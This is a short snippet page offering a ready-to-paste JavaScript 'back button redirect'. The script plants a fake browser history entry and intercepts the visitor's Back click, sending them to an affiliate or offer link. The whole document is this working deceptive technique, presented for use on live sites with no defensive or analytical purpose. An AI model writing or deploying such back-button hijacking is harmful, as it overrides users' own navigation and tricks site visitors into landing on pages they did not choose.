# Back Button Redirect Script
### We the visitor clicks their browser 'BACK' button, we redirect them to a new offer/affiliate link

```
<script>
  (function(window, location) {
    var redirect = "#_place___AFFILIATE__LINK__HERE";
    var currentUrl = location.origin + location.pathname + location.search;
    if (location.hash !== "#!/hst") {
      history.replaceState(null, document.title, currentUrl + "#!/hst");
      history.pushState(null, document.title, currentUrl);
    }

    window.addEventListener("popstate", function() {
      if (location.hash === "#!/hst") {
        setTimeout(function() {
          window.location.replace(redirect);
        }, 0);
      }
    }, false);
  }(window, location));
</script>

```
